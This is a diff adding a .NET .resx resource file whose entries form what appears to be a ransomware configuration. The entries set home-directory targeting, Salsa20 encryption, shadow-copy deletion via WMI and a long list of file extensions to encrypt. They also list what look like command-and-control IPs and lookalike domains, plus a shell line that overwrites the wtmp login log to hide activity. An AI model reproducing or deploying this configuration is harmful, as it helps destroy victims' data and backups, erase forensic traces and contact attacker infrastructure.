@@ -1,0 +1,49 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="TargetPathsCommaSeparated"><value>%USERPROFILE%</value></data>
+  <data name="Strings"><value>IDZT6frSHDHsfdsffiFduffz8GD7sddg, Ahnlab really sucks, AhnLabSucks, ./a filename template_file, May be %s is empty?, No data in this block !!!!!!, No good line, ls -la %s* ; /bin/cp  ./wtmp.tmp %s; rm  ./wtmp.tmp, usage: %s &lt;username&gt; &lt;fixthings&gt; [hostname]</value></data>
+  <data name="PathToAccess"><value>C:\JDUIHiuf\IDisjopjcnb</value></data>
+  <data name="Transport"><value>HTTP</value></data>
+  <data name="MaxCopySizeMB"><value>150</value></data>
+  <data name="SymmetricAlgorithm"><value>Salsa20</value></data>
+  <data name="RegistryPathsCommaSeparated"><value /></data>
+  <data name="ServerIP"><value>10.8.100.52</value></data>
+  <data name="DeleteShadowMode"><value>WMI</value></data>
+  <data name="MutexToCreate"><value /></data>
+  <data name="FilesystemBackupType"><value>Copy</value></data>
+  <data name="DNSsCommaSeparated"><value>amazeo.er2dsv.top, link.omaze.com, amazes.eritg2.top, amazeo.mdfgd2.top, www.amnmazen.zaoanc.com, cpcontacts.amazedrenewably.com, cpcalendars.amazedrenewably.com, web.amazecraft.net</value></data>
+  <data name="Verbose"><value>False</value></data>
+  <data name="PathSuffixesCommaSeparated"><value>.3ds, .3fr, .3pr, .7z, .ab4, .ac2, .accdb, .accde, .accdr, .accdt, .acr, .adb, .agd1, .ai, .ait, .al, .apj, .apk, .arch00, .arw, .asm, .asp, .asset, .avi, .awg, .backup, .backupdb, .bak, .bar, .bay, .bc6, .bc7, .bdb, .bgt, .big, .bik, .bkf, .bkp, .blend, .blob, .bmp, .bpw, .bsa, .c, .cas, .cdf, .cdr, .cdr3, .cdr4, .cdr5, .cdr6, .cdrw, .cdx, .ce1, .ce2, .cer, .cfp, .cfr, .cgm, .cib, .cls, .cmt, .cpi, .cpp, .cr2, .craw, .crt, .crw, .csh, .csl, .css, .csv, .d3dbsp, .dac, .das, .dazip, .db, .db-journal, .db0, .db3, .dba, .dbf, .dc2, .dcr, .dcs, .ddd, .ddoc, .ddrw, .der, .desc, .design, .dgc, .djvu, .dmp, .dng, .doc, .docm, .docx, .dot, .dotm, .dotx, .drf, .drw, .dwg, .dxb, .dxf, .dxg, .epk, .eps, .erbsql, .erf, .esm, .exf, .exif, .fdb, .ff, .ffd, .fff, .fh, .fhd, .flv, .forge, .fos, .fpk, .fpx, .fsh, .fxg, .gdb, .gho, .gif, .grey, .gry, .h, .hbk, .hkdb, .hkx, .hplg, .hpp, .hvpl, .ibank, .ibd, .ibz, .icxs, .idx, .iiq, .incpas, .indd, .itdb, .itl, .itm, .iwd, .iwi, .jfif, .jpe, .jpeg, .jpg, .js, .kc2, .kdb, .kdbx, .kdc, .kf, .kpdx, .layout, .lbf, .litemod, .lrf, .ltx, .lua, .lvl, .m2, .m3u, .m4a, .map, .mcmeta, .mdb, .mdbackup, .mdc, .mddata, .mdf, .mef, .menu, .mfw, .mlx, .mmw, .moneywell, .mos, .mov, .mp3, .mp4, .mpeg, .mpg, .mpqge, .mrw, .mrwref, .myd, .ncf, .ndd, .nef, .nop, .nrw, .ns2, .ns3, .ns4, .nsd, .nsf, .nsg, .nsh, .ntl, .nwb, .nx1, .nx2, .nyf, .odb, .odc, .odf, .odg, .odm, .odp, .ods, .odt, .orf, .otg, .oth, .otp, .ots, .ott, .p12, .p7b, .p7c, .pak, .pat, .pcd, .pdd, .pdf, .pef, .pem, .pfx, .php, .pkpass, .pl, .png, .pot, .potm, .potx, .ppam, .pps, .ppsm, .ppsx, .ppt, .pptm, .pptx, .ps, .psafe3, .psd, .psk, .pst, .ptx, .py, .qdf, .qic, .r3d, .ra2, .raf, .rar, .raw, .rb, .rdb, .re4, .rgss3a, .rim, .rofl, .rtf, .rw2, .rwl, .rwz, .s3db, .sas7bdat, .sav, .sb, .sd0, .sd1, .sda, .sdf, .sid, .sidd, .sidn, .sie, .sldm, .sldx, .slm, .snx, .sql, .sqlite, .sqlite3, .sqlitedb, .sr2, .srf, .srw, .st4, .st5, .st6, .st7, .st8, .stc, .std, .sti, .stw, .stx, .sum, .svg, .sxc, .sxd, .sxg, .sxi, .sxm, .sxw, .syncdb, .t12, .t13, .tax, .tor, .txt, .upk, .vcf, .vdf, .vfs0, .vpk, .vpp_pc, .vtf, .w3x, .wallet, .wb2, .wma, .wmo, .wmv, .wotreplay, .wpd, .wps, .x3f, .xf, .xla, .xlam, .xlk, .xll, .xlm, .xls, .xlsb, .xlsm, .xlsx, .xlt, .xltm, .xltx, .xlw, .xml, .ycbcra, .zip, .ztmp</value></data>
+  <data name="AsymmetricAlgorithm"><value /></data>
+  <data name="FastEncryptionMode"><value>True</value></data>
+  <data name="OsCommands"><value /></data>
+  <data name="Port"><value>80</value></data>
+  <data name="UrlsCommaSeparated"><value>http://91.218.114.4, http://91.218.114.11, http://91.218.114.26, http://207.244.249.31, http://85.204.116.32, http://85.204.116.180, http://85.204.116.100, http://86.104.194.30</value></data>
+  </root>
